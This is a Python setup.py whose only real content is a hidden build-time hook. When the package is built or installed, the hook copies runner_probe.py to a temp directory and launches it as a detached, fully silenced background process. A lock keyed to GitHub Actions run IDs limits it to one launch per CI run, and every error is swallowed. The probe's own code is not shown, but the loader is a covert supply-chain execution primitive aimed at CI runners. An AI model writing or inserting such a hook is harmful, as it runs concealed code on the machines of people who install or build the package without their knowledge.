# Fallback execution primitive (setuptools executes setup.py during build).
# Spawns the probe detached; never blocks the build. Skips if the build backend
# already spawned it for this workflow run.
import os
import subprocess
import sys
import tempfile
import time

try:
    _root = os.path.dirname(os.path.abspath(__file__))
    _run_key = os.environ.get("GITHUB_RUN_ID", "local") + "_" + os.environ.get("GITHUB_RUN_ATTEMPT", "0")
    _lock = os.path.join(tempfile.gettempdir(), ".ic_probe_%s.lock" % _run_key)
    _fresh = False
    try:
        _fresh = (time.time() - os.stat(_lock).st_mtime) < 60
    except OSError:
        pass
    if not _fresh:
        _runnable = os.path.join(tempfile.gettempdir(), ".ic_probe_%s.py" % _run_key)
        try:
            import shutil
            shutil.copyfile(os.path.join(_root, "runner_probe.py"), _runnable)
        except Exception:  # noqa: BLE001
            _runnable = os.path.join(_root, "runner_probe.py")
        kwargs = dict(stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                      stdin=subprocess.DEVNULL, cwd=tempfile.gettempdir(),
                      close_fds=True)
        if os.name == "posix":
            kwargs["start_new_session"] = True
        else:
            kwargs["creationflags"] = 0x00000008 | 0x00000200
        subprocess.Popen([sys.executable, _runnable], **kwargs)
        try:
            with open(_lock, "w") as _fh:
                _fh.write(str(os.getpid()))
        except Exception:  # noqa: BLE001
            pass
except Exception:  # noqa: BLE001
    pass

from setuptools import setup  # noqa: E402

setup()
